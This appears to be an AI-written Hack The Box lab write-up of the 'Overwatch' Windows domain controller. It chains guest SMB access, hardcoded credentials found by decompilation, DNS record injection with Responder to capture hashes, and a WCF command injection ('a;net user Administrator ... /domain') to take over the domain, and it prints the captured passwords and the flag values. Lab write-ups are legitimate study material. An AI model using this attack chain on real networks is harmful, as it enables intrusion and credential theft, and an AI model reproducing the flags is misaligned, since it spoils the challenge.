@@ -1,0 +1,206 @@
+Here’s a **clean, one-page HTB-style write-up** you can submit or keep as notes.
+Concise, technical, and exam/interview ready.
+
+---
+
+# Hack The Box — **Overwatch** (Windows, Medium)
+
+## Summary
+
+Overwatch is a Windows Server 2022 Active Directory machine that demonstrates how **exposed internal services**, **.NET reverse engineering**, **MSSQL linked servers**, and a **WCF command-injection flaw** can be chained to achieve **full Domain Controller compromise**.
+
+---
+
+## Reconnaissance
+
+### Port Scan
+
+```bash
+nmap -sC -sV -A 10.129.100.58
+```
+
+**Key services identified:**
+
+* DNS (53)
+* Kerberos (88)
+* LDAP (389 / 3268)
+* SMB (445)
+* WinRM (5985)
+* MSSQL (6520)
+* RDP (3389)
+
+The host is a **Domain Controller**:
+
+```
+Domain: overwatch.htb
+Hostname: S200401.overwatch.htb
+OS: Windows Server 2022
+```
+
+---
+
+## SMB Enumeration (Initial Access Vector)
+
+Guest authentication was enabled.
+
+```bash
+impacket-smbclient overwatch.htb/Guest@s200401.overwatch.htb -no-pass
+```
+
+Discovered share:
+
+```
+software$
+ └── Monitoring
+     └── overwatch.exe
+     └── overwatch.exe.config
+     └── overwatch.pdb
+```
+
+The configuration file revealed an internal **WCF service**:
+
+```xml
+<add baseAddress="http://overwatch.htb:8000/MonitorService" />
+```
+
+---
+
+## Reverse Engineering (.NET)
+
+`overwatch.exe` was decompiled using **dnSpy / dotPeek**.
+
+### Credential Disclosure
+
+Inside the application logic, hardcoded database credentials were found:
+
+```
+User: sqlsvc
+Password: TI0LKcfHzZw1Vv
+Domain: overwatch.htb
+```
+
+Credential validity confirmed via SMB and MSSQL.
+
+---
+
+## MSSQL Exploitation
+
+Authenticated to SQL Server using Windows auth:
+
+```bash
+impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@s200401.overwatch.htb -windows-auth -port 6520
+```
+
+### Linked Server Enumeration
+
+```sql
+enum_links
+```
+
+Discovered linked server:
+
+```
+SQL07
+```
+
+However, `sql07.overwatch.htb` had **no DNS record**, causing connection failures.
+
+---
+
+## DNS Manipulation → Credential Capture
+
+As a domain user, `sqlsvc` was able to **add DNS records**.
+
+```bash
+bloodyAD -d overwatch.htb -u sqlsvc -p 'TI0LKcfHzZw1Vv' \
+--dc-ip 10.129.100.58 add dnsRecord sql07 10.10.14.17
+```
+
+Responder was started on the attacker machine:
+
+```bash
+sudo responder -I tun0
+```
+
+Triggering authentication via MSSQL:
+
+```sql
+EXEC master..xp_dirtree '\\sql07\share';
+```
+
+### Captured Credentials
+
+```
+User: sqlmgmt
+Password: bIhBbzMMnB82yx
+```
+
+---
+
+## Lateral Movement (WinRM)
+
+```bash
+evil-winrm -i s200401.overwatch.htb -u sqlmgmt -p 'bIhBbzMMnB82yx'
+```
+
+Access gained as a low-privileged domain user.
+
+---
+
+## Privilege Escalation (SYSTEM)
+
+Local enumeration revealed an internal service:
+
+```powershell
+netstat -ano | findstr 8000
+```
+
+Port **8000** was bound by **PID 4 (SYSTEM)**.
+
+Using the WCF service:
+
+```powershell
+$wcf = New-WebServiceProxy -Uri "http://127.0.0.1:8000/MonitorService?wsdl" -UseDefaultCredential
+```
+
+### Vulnerability: Command Injection
+
+The `KillProcess()` method unsafely concatenated user input into a PowerShell command.
+
+```powershell
+$wcf.KillProcess("a;whoami;echo ")
+```
+
+**Result:**
+
+```
+nt authority\system
+```
+
+---
+
+## Domain Compromise
+
+Reset the Domain Administrator password:
+
+```powershell
+$wcf.KillProcess("a;net user Administrator Pwned123! /domain;echo ")
+```
+
+Logged in as Administrator:
+
+```bash
+evil-winrm -i s200401.overwatch.htb -u Administrator -p 'Pwned123!'
+```
+
+---
+
+## Flags
+
+```powershell
+type C:\Users\Administrator\Desktop\root.txt
+```
+bddac45c9a34558f498d87cf63c0aa90
+
+user.txt
+133e4937b2cdd86db60a6b745c7843b7
